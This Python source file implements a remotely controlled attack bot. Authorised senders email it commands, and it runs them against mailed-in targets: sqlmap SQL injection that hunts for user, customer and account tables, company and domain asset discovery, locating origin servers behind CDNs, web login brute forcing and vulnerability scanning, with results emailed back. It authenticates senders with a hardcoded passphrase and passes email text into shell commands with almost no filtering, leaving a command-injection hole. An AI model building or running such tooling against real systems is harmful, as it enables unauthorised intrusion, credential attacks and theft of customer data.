import base64
import imaplib
import subprocess

from Global import username, password, AddToAuthedUserList, IsInAuthedUserList
from emailsender.sender import send_email, send_email_with_attachment
from utils.fileutils import setPrefixAndSuffix
from utils.randStr import getRandomStr

CDLA = False  # companyDoingLockerActived


def shell(command):
    # 在shell中执行命令并捕获其输出结果
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, error = process.communicate()

    # 将命令的输出结果转换为字符串并返回
    output_str = output.decode('utf-8')
    return output_str


def mark_all_as_read(username, password, imap_server):
    # 连接IMAP服务器
    imap = imaplib.IMAP4_SSL(imap_server)
    # 登录
    imap.login(username, password)
    # 选择收件箱
    imap.select('INBOX')
    # 搜索未读邮件
    _, messages = imap.search(None, 'UNSEEN')
    # 获取所有未读邮件的编号
    message_list = messages[0].split()
    # 将所有未读邮件标记为已读
    for message in message_list:
        imap.store(message, '+FLAGS', '\\Seen')
    # 关闭连接
    imap.close()
    imap.logout()


def doCommand(sender, body: str):
    global CDLA
    # fliter
    body = body.replace("\n\n", "\n")
    body = body.replace("\r\n", "\n")
    body = body.replace("|", "")
    # do
    try:
        if "sqlinj\n" in body:
            # sqlinj
            body = body.replace("sqlinj\n", "")

            TmpFileName = str(hash(body)) + ".sqlinj.tmp"
            b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
            send_email(sender, "您输入的内容被当作sql注入自动处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                b64FileContent, TmpFileName), subject="自动处理 sql注入")
            shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
            ret = shell(
                "sqlmap -r %s --batch --level=5 --risk=3 --threads=10 --dbs --ignore-code=404 --search -T user,order,"
                "customer,kehu,student,account --stop=10&&sqlmap -r %s --batch "
                "--level=5 --risk=3 --search -T user,order,customer,kehu,student,account --stop=10"
                "--threads=10 --dbs --force-ssl --ignore-code=404" % (TmpFileName, TmpFileName))
            ret2 = shell(f'sqlmap -r {TmpFileName} --batch --count --ignore-code=404 --threads=10')
            ret3 = shell(f'sqlmap -r {TmpFileName} --batch --count --force-ssl --ignore-code=404 --threads=10')
            ret += ret2
            ret += ret3
            status = '失败'
            if "Payload:" in ret:
                status = '成功'
            send_email(sender, "*SQL注入结果\n%s" % ret, subject="SQL INJ 结果%s" % status)
        if 'fofasearch\n' in body:
            body = body.replace("fofasearch\n", "")
            if not CDLA:
                CDLA = True
                # code block 域名列表找资产
                TmpFileName = "fofasearch/list"
                b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
                send_email(sender,
                           "您输入的内容被当作 域名列表->资产 自动处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                               b64FileContent, TmpFileName), subject="自动处理 域名列表->资产")
                shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
                shell('chmod +x fofasearch/search.sh && chmod +x fofasearch/run.sh')
                setPrefixAndSuffix('fofasearch/list', suffix="")  # 域名列表解析为可fofax搜索的格式
                shell('cd fofasearch/ && ./run.sh && cd ..')  # 执行fofax搜索
                ret2 = shell("cat fofasearch/weak_website.csv")  # 获取fofax结果
                send_email(sender, ret2, "公司的资产结果")
                # code block done
                CDLA = False
        if "company\n" in body:
            # 公司名找资产
            if not CDLA:
                CDLA = True
                body = body.replace("company\n", "")

                TmpFileName = "company/list"
                b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
                send_email(sender,
                           "您输入的内容被当作 公司名->资产 自动处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                               b64FileContent, TmpFileName), subject="自动处理 公司名->资产")
                shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
                shell('chmod +x company/autoGetInfo.sh && chmod +x company/ENScan && chmod +x company/getSheet_linux')
                shell('cd company/ && ./autoGetInfo.sh && cd ..')  # 运行获取
                domain_list = shell('cat company/outs/output.txt')
                send_email(sender, "域名列表如下%s" % domain_list, subject="域名列表 下一步 -> 获取资产")
                # 域名找资产
                shell('chmod +x fofasearch/search.sh && chmod +x fofasearch/run.sh')
                shell('mv company/outs/output.txt fofasearch/list')  # 域名列表复制过来
                setPrefixAndSuffix('fofasearch/list', suffix="")  # 域名列表解析为可fofax搜索的格式
                shell('cd fofasearch/ && ./run.sh && cd ..')  # 执行fofax搜索
                ret2 = shell("cat fofasearch/weak_website.csv")  # 获取fofax结果
                send_email(sender, ret2, "公司的资产结果")
                CDLA = False
        if 'bypasscdn\n' in body:
            if body.count("\n") > 1:
                send_email(sender, "你输入的太多了\n格式为:\nbypasscdn\nhttps://www.baidu.com/", "bypasscdn-错误提示")
            else:
                body = body.replace("bypasscdn\n", "")
                TmpFileName = "bypasscdn/" + getRandomStr()
                b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
                shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
                send_email(sender,
                           "您输入的内容被当作绕过cdn查找源站处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                               b64FileContent, TmpFileName),
                           subject="自动处理 cdn查找源站 注意，此模式只允许输入一行资产，格式为http/https://xxx")
                ret = shell("cd bypasscdn && chmod +x run.sh && ./run.sh %s && cd .." % body)
                send_email(sender, ret, "bypasscdn结果")
        if 'fuckweblogin\n' in body:
            body = body.replace("fuckweblogin\n", "")
            TmpFileName = "fuckweblogin/url.txt"
            b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
            shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
            send_email(sender,
                       "您输入的内容被当作网页登录爆破处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                           b64FileContent, TmpFileName),
                       subject="自动处理 网页登录爆破")
            ret = shell("cd fuckweblogin && chmod +x run.sh && ./run.sh && cd ..")
            send_email(sender, ret, "网页登录爆破结果")
        if 'scaninfo\n' in body:
            body = body.replace("scaninfo\n", "")
            FileNameRaw = getRandomStr()
            TmpFileName = "scaninfo/" + FileNameRaw
            b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
            shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
            send_email(sender,
                       "您输入的内容被当作信息收集和F漏扫处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                           b64FileContent, TmpFileName),
                       subject="自动处理 信息收集和F漏扫")
            ret = shell("cd scaninfo && chmod +x scaninfo && ./scaninfo -l " + FileNameRaw + " -np -t1000 && cd ..")
            send_email_with_attachment(sender, ret, 'scaninfo/result.xlsx', "scaninfo结果")
        if 'domaincrawler\n' in body:
            body = body.replace("domaincrawler\n", "")
            FileNameRaw = getRandomStr()
            TmpFileName = "domaincrawler/" + FileNameRaw
            b64FileContent = base64.b64encode(body.encode("utf-8")).decode("utf-8")
            shell('echo "%s" | base64 -d > %s' % (b64FileContent, TmpFileName))
            send_email(sender,
                       "您输入的内容被当作DomainCrawler(DC)处理，结果会稍后返回到此邮箱\n B64FC:%s\nTMPFN:%s" % (
                           b64FileContent, TmpFileName),
                       subject="自动处理 DomainCrawler")
            ret = shell(
                "cd domaincrawler && rm -rf tmp.zip && rm -rf *.csv && chmod +x DC && ./DC -f " + FileNameRaw + " && cd ..")
            shell("cd domaincrawler && zip -r tmp.zip . && cd ..")
            send_email_with_attachment(sender, ret, 'domaincrawler/tmp.zip', "domaincrawler结果")
    except Exception as e:
        print("- %s" % e)
        send_email(sender, e, "错误 - doAuthedCommand函数错误捕捉")
        mark_all_as_read(username, password, "imap.qq.com")


def do(sender, body):
    try:
        mark_all_as_read(username, password, "imap.qq.com")
        print("* got mail " + sender + ":" + body)
        if not IsInAuthedUserList(sender):
            # 如果不在列表中
            if body == "Lsofadmin37695382":  # 对方想验证并且没有验证过
                AddToAuthedUserList(sender)
                send_email(sender, "您已验证成功 接下来发送的信息都会被当作指令处理")
                print("* %s验证成功" % sender)
            else:
                send_email(sender, "你是谁?")
        else:
            doCommand(sender, body)
    except Exception as e:
        send_email(sender, e, "错误 - do函数错误捕捉")
